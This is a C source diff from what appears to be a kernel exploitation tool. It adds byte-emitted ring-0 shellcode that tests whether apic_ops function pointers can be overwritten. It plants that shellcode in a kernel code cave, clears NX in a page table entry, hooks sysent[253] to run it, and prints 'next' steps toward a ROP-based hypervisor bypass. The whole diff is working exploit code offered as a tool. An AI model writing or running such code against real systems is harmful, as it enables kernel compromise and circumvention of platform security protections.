@@ -1318,6 +1318,160 @@ static int build_ring0_msr_shellcode(uint8_t *buf, int bufmax,
     return p;
 }
 
+/*
+ * Build ring-0 shellcode for apic_ops CFI writeback test.
+ *
+ * Tests whether apic_ops function pointers can be written from ring 0.
+ * This is the prerequisite for the flatz suspend/resume HV bypass.
+ *
+ * Test 1 (same-value writeback):
+ *   - Read current apic_ops[2] (xapic_mode)
+ *   - Write the same value back
+ *   - Read again to verify write took effect
+ *   → If match: slot is writable, no CFI trap on same-value write
+ *
+ * Test 2 (cross-type write):
+ *   - Write apic_ops[0] (create) value into apic_ops[2] (xapic_mode)
+ *   - Read back to verify
+ *   - IMMEDIATELY restore original apic_ops[2] value
+ *   → If match: we can overwrite with arbitrary ktext pointer
+ *
+ * Result buffer layout (offsets from output_kva):
+ *   [0]   magic (8 bytes)
+ *   [8]   status (4 bytes) — 1=running, 2=done
+ *   [32]  original_val (8 bytes) — apic_ops[2] before test
+ *   [40]  slot0_val (8 bytes) — apic_ops[0] (used for cross-type)
+ *   [48]  test1_readback (8 bytes) — after same-value write
+ *   [56]  test1_ok (4 bytes) — 1=match
+ *   [64]  test2_readback (8 bytes) — after cross-type write
+ *   [72]  test2_ok (4 bytes) — 1=match
+ *   [80]  restore_readback (8 bytes) — after restoring original
+ *   [88]  restore_ok (4 bytes) — 1=match
+ */
+static int build_ring0_apic_writeback_shellcode(uint8_t *buf, int bufmax,
+                                                 uint64_t output_kva,
+                                                 uint64_t apic_ops_kva) {
+    int p = 0;
+
+    #define EMIT(b) do { if (p < bufmax) buf[p++] = (uint8_t)(b); } while(0)
+    #define EMIT_U32(v) do { uint32_t _v=(v); memcpy(&buf[p],&_v,4); p+=4; } while(0)
+    #define EMIT_U64(v) do { uint64_t _v=(v); memcpy(&buf[p],&_v,8); p+=8; } while(0)
+
+    uint64_t slot2_kva = apic_ops_kva + 0x10;  /* xapic_mode */
+    uint64_t slot0_kva = apic_ops_kva;          /* create */
+
+    /* movabs $output_kva, %rdi   — result buffer pointer */
+    EMIT(0x48); EMIT(0xBF); EMIT_U64(output_kva);
+
+    /* Write magic: movabs $KMOD_MAGIC, %rax; mov %rax, (%rdi) */
+    EMIT(0x48); EMIT(0xB8); EMIT_U64(0xCAFEBABEDEAD1337ULL);
+    EMIT(0x48); EMIT(0x89); EMIT(0x07);
+
+    /* status = RUNNING: movl $1, 8(%rdi) */
+    EMIT(0xC7); EMIT(0x47); EMIT(0x08); EMIT_U32(1);
+
+    /* ── Read apic_ops[2] (xapic_mode) ── */
+    /* movabs $slot2_kva, %rsi */
+    EMIT(0x48); EMIT(0xBE); EMIT_U64(slot2_kva);
+    /* mov (%rsi), %rax  — original value */
+    EMIT(0x48); EMIT(0x8B); EMIT(0x06);
+    /* mov %rax, 32(%rdi) — store original_val */
+    EMIT(0x48); EMIT(0x89); EMIT(0x47); EMIT(0x20);
+    /* Save original in R12 for later restore */
+    /* push %r12 */
+    EMIT(0x41); EMIT(0x54);
+    /* mov %rax, %r12 */
+    EMIT(0x49); EMIT(0x89); EMIT(0xC4);
+
+    /* ── Read apic_ops[0] (create) for cross-type test ── */
+    /* movabs $slot0_kva, %rcx */
+    EMIT(0x48); EMIT(0xB9); EMIT_U64(slot0_kva);
+    /* mov (%rcx), %rdx — slot0 value */
+    EMIT(0x48); EMIT(0x8B); EMIT(0x11);
+    /* Save slot0 in R13 */
+    /* push %r13 */
+    EMIT(0x41); EMIT(0x55);
+    /* mov %rdx, %r13 */
+    EMIT(0x49); EMIT(0x89); EMIT(0xD5);
+    /* mov %rdx, 40(%rdi) — store slot0_val */
+    EMIT(0x48); EMIT(0x89); EMIT(0x57); EMIT(0x28);
+
+    /* ═══ Test 1: Same-value writeback ═══ */
+    /* mov %r12, (%rsi) — write original value back to slot2 */
+    EMIT(0x4C); EMIT(0x89); EMIT(0x26);
+    /* mfence */
+    EMIT(0x0F); EMIT(0xAE); EMIT(0xF0);
+    /* mov (%rsi), %rax — read back */
+    EMIT(0x48); EMIT(0x8B); EMIT(0x06);
+    /* mov %rax, 48(%rdi) — store test1_readback */
+    EMIT(0x48); EMIT(0x89); EMIT(0x47); EMIT(0x30);
+    /* cmp %r12, %rax */
+    EMIT(0x4C); EMIT(0x39); EMIT(0xE0);
+    /* sete %al */
+    EMIT(0x0F); EMIT(0x94); EMIT(0xC0);
+    /* movzbl %al, %eax */
+    EMIT(0x0F); EMIT(0xB6); EMIT(0xC0);
+    /* mov %eax, 56(%rdi) — store test1_ok */
+    EMIT(0x89); EMIT(0x47); EMIT(0x38);
+
+    /* ═══ Test 2: Cross-type write (slot0 → slot2) ═══ */
+    /* mov %r13, (%rsi) — write slot0 value into slot2 */
+    EMIT(0x4C); EMIT(0x89); EMIT(0x2E);
+    /* mfence */
+    EMIT(0x0F); EMIT(0xAE); EMIT(0xF0);
+    /* mov (%rsi), %rax — read back */
+    EMIT(0x48); EMIT(0x8B); EMIT(0x06);
+    /* mov %rax, 64(%rdi) — store test2_readback */
+    EMIT(0x48); EMIT(0x89); EMIT(0x47); EMIT(0x40);
+    /* cmp %r13, %rax */
+    EMIT(0x4C); EMIT(0x39); EMIT(0xE8);
+    /* sete %al */
+    EMIT(0x0F); EMIT(0x94); EMIT(0xC0);
+    /* movzbl %al, %eax */
+    EMIT(0x0F); EMIT(0xB6); EMIT(0xC0);
+    /* mov %eax, 72(%rdi) — store test2_ok */
+    EMIT(0x89); EMIT(0x47); EMIT(0x48);
+
+    /* ═══ Restore: Write original back to slot2 ═══ */
+    /* mov %r12, (%rsi) — restore original value */
+    EMIT(0x4C); EMIT(0x89); EMIT(0x26);
+    /* mfence */
+    EMIT(0x0F); EMIT(0xAE); EMIT(0xF0);
+    /* mov (%rsi), %rax — read back after restore */
+    EMIT(0x48); EMIT(0x8B); EMIT(0x06);
+    /* mov %rax, 80(%rdi) — store restore_readback */
+    EMIT(0x48); EMIT(0x89); EMIT(0x47); EMIT(0x50);
+    /* cmp %r12, %rax */
+    EMIT(0x4C); EMIT(0x39); EMIT(0xE0);
+    /* sete %al */
+    EMIT(0x0F); EMIT(0x94); EMIT(0xC0);
+    /* movzbl %al, %eax */
+    EMIT(0x0F); EMIT(0xB6); EMIT(0xC0);
+    /* mov %eax, 88(%rdi) — store restore_ok */
+    EMIT(0x89); EMIT(0x47); EMIT(0x58);
+
+    /* ── Finalize ── */
+    /* pop %r13; pop %r12 */
+    EMIT(0x41); EMIT(0x5D);
+    EMIT(0x41); EMIT(0x5C);
+
+    /* status = DONE: movl $2, 8(%rdi) */
+    EMIT(0xC7); EMIT(0x47); EMIT(0x08); EMIT_U32(2);
+
+    /* mfence */
+    EMIT(0x0F); EMIT(0xAE); EMIT(0xF0);
+
+    /* xor %eax, %eax; ret */
+    EMIT(0x31); EMIT(0xC0);
+    EMIT(0xC3);
+
+    #undef EMIT
+    #undef EMIT_U32
+    #undef EMIT_U64
+
+    return p;
+}
+
 static void campaign_kmod_kldload(void) {
     printf("\n=============================================\n");
     printf("  Campaign 7: Kernel Module (kldload)\n");
@@ -4062,6 +4216,160 @@ ring3_fallback:
                 }
                 printf("\n");
                 fflush(stdout);
+
+                /* ─── Phase 5: apic_ops CFI Writeback Test ─── */
+                if (apic_ops_addr) {
+                    printf("=============================================\n");
+                    printf("  Ring-0 Phase 5: apic_ops Writeback Test\n");
+                    printf("=============================================\n\n");
+                    printf("[*] Testing if apic_ops function pointers are writable.\n");
+                    printf("    apic_ops base: 0x%lx (kdata+0x%lx)\n",
+                           (unsigned long)apic_ops_addr,
+                           (unsigned long)(apic_ops_addr - g_kdata_base));
+                    printf("    xapic_mode [2]: 0x%lx (kdata+0x%lx)\n",
+                           (unsigned long)(apic_ops_addr + 0x10),
+                           (unsigned long)(apic_ops_addr - g_kdata_base + 0x10));
+                    fflush(stdout);
+
+                    /* Build writeback test shellcode */
+                    uint8_t wb_sc[512];
+                    int wb_sc_len = build_ring0_apic_writeback_shellcode(
+                        wb_sc, sizeof(wb_sc), result_kva, apic_ops_addr);
+                    printf("[*] Writeback test shellcode: %d bytes\n", wb_sc_len);
+
+                    if (wb_sc_len <= 0 || wb_sc_len > 480) {
+                        printf("[-] Shellcode too large or failed to build.\n");
+                    } else {
+                        /* Clear shared buffer */
+                        uint8_t zero_buf2[256];
+                        memset(zero_buf2, 0, sizeof(zero_buf2));
+                        for (int zb = 0; zb < KMOD_RESULT_ALLOC_SIZE; zb += 256)
+                            kernel_copyin(zero_buf2, g_dmap_base + cpu_pa + zb, 256);
+
+                        /* Save and write shellcode to kdata cave */
+                        uint8_t wb_backup[512];
+                        kernel_copyout(g_dmap_base + target_pa, wb_backup, wb_sc_len);
+                        printf("[*] Writing shellcode to kdata code cave...\n");
+                        kernel_copyin(wb_sc, g_dmap_base + target_pa, wb_sc_len);
+
+                        /* Verify write */
+                        uint8_t wb_verify[512];
+                        kernel_copyout(g_dmap_base + target_pa, wb_verify, wb_sc_len);
+                        int wb_match = (memcmp(wb_sc, wb_verify, wb_sc_len) == 0);
+                        printf("    Write verify: %s\n", wb_match ? "OK" : "MISMATCH");
+                        fflush(stdout);
+
+                        if (wb_match) {
+                            /* Clear NX+G in PTE */
+                            printf("[*] Clearing NX+G in PTE...\n");
+                            kernel_copyin(&new_pte, g_dmap_base + pte_pa, 8);
+
+                            /* Hook sysent[253] */
+                            printf("[*] Hooking sysent[253] → kdata_base...\n");
+                            kernel_copyin(&target_kva, g_dmap_base + s253_call_pa, 8);
+                            kernel_copyin(&narg_zero, g_dmap_base + s253_narg_pa, 4);
+
+                            /* Execute writeback test in ring 0 */
+                            printf("[*] Calling syscall(253) — apic_ops writeback test in ring 0...\n");
+                            fflush(stdout);
+                            errno = 0;
+                            long wb_ret = syscall(253);
+                            int wb_err = errno;
+                            printf("    syscall(253) returned: %ld, errno=%d\n",
+                                   wb_ret, wb_err);
+
+                            /* Restore everything immediately */
+                            printf("[*] Restoring PTE, sysent, code cave...\n");
+                            kernel_copyin(s253_orig, g_dmap_base + s253_pa, SYSENT_STRIDE);
+                            kernel_copyin(&orig_pte, g_dmap_base + pte_pa, 8);
+                            kernel_copyin(wb_backup, g_dmap_base + target_pa, wb_sc_len);
+                            printf("    All restored.\n\n");
+                            fflush(stdout);
+
+                            /* Parse results */
+                            struct kmod_result_buf wb_results;
+                            memcpy(&wb_results, result_vaddr, sizeof(wb_results));
+
+                            if (wb_results.magic == KMOD_MAGIC &&
+                                wb_results.status == KMOD_STATUS_DONE) {
+                                /* Extract results from buffer offsets */
+                                uint64_t original_val, slot0_val;
+                                uint64_t t1_readback, t2_readback, restore_rb;
+                                uint32_t t1_ok, t2_ok, restore_ok;
+                                memcpy(&original_val, (uint8_t*)result_vaddr + 32, 8);
+                                memcpy(&slot0_val, (uint8_t*)result_vaddr + 40, 8);
+                                memcpy(&t1_readback, (uint8_t*)result_vaddr + 48, 8);
+                                memcpy(&t1_ok, (uint8_t*)result_vaddr + 56, 4);
+                                memcpy(&t2_readback, (uint8_t*)result_vaddr + 64, 8);
+                                memcpy(&t2_ok, (uint8_t*)result_vaddr + 72, 4);
+                                memcpy(&restore_rb, (uint8_t*)result_vaddr + 80, 8);
+                                memcpy(&restore_ok, (uint8_t*)result_vaddr + 88, 4);
+
+                                printf("[+] apic_ops[2] (xapic_mode) = 0x%016lx\n",
+                                       (unsigned long)original_val);
+                                printf("[+] apic_ops[0] (create)     = 0x%016lx\n",
+                                       (unsigned long)slot0_val);
+
+                                printf("\n[*] Test 1: Same-value writeback\n");
+                                printf("    Wrote:    0x%016lx → apic_ops[2]\n",
+                                       (unsigned long)original_val);
+                                printf("    Readback: 0x%016lx\n",
+                                       (unsigned long)t1_readback);
+                                if (t1_ok) {
+                                    printf("[+] TEST 1 PASSED — same-value write OK\n");
+                                } else {
+                                    printf("[-] TEST 1 FAILED — readback mismatch!\n");
+                                    printf("    CFI or HV may be blocking writes.\n");
+                                }
+
+                                printf("\n[*] Test 2: Cross-type write (slot0 → slot2)\n");
+                                printf("    Wrote:    0x%016lx → apic_ops[2]\n",
+                                       (unsigned long)slot0_val);
+                                printf("    Readback: 0x%016lx\n",
+                                       (unsigned long)t2_readback);
+                                if (t2_ok) {
+                                    printf("[+] TEST 2 PASSED — cross-type write OK!\n");
+                                    printf("    apic_ops[2] can be overwritten with arbitrary ktext ptr.\n");
+                                } else {
+                                    printf("[-] TEST 2 FAILED — cross-type write blocked!\n");
+                                    printf("    HV or CFI may enforce pointer types.\n");
+                                }
+
+                                printf("\n[*] Restore verification:\n");
+                                printf("    Readback: 0x%016lx\n",
+                                       (unsigned long)restore_rb);
+                                if (restore_ok) {
+                                    printf("[+] RESTORE OK — original value confirmed\n");
+                                } else {
+                                    printf("[!] RESTORE MISMATCH — apic_ops may be corrupted!\n");
+                                }
+
+                                if (t1_ok && t2_ok && restore_ok) {
+                                    printf("\n[+] ============================================\n");
+                                    printf("[+]  APIC_OPS WRITABLE — READY FOR FLATZ METHOD\n");
+                                    printf("[+] ============================================\n");
+                                    printf("[+] apic_ops[2] (xapic_mode) can be overwritten.\n");
+                                    printf("[+] Next: overwrite with ROP gadget, trigger suspend/resume.\n");
+                                    printf("[+] Target address: 0x%lx\n",
+                                           (unsigned long)(apic_ops_addr + 0x10));
+                                }
+                            } else if (wb_err != 0) {
+                                printf("[-] Writeback test CRASHED (errno=%d)\n", wb_err);
+                                printf("    The HV may trap writes to apic_ops.\n");
+                            } else {
+                                printf("[-] Writeback test did not complete.\n");
+                                printf("    Magic: 0x%lx, Status: %u\n",
+                                       (unsigned long)wb_results.magic,
+                                       wb_results.status);
+                            }
+                        } else {
+                            /* Restore on verify failure */
+                            kernel_copyin(wb_backup, g_dmap_base + target_pa, wb_sc_len);
+                        }
+                    }
+                    printf("\n");
+                    fflush(stdout);
+                }
             } else if (buf_check != 0) {
                 printf("[?] Buffer has unexpected value: 0x%lx\n",
                        (unsigned long)buf_check);
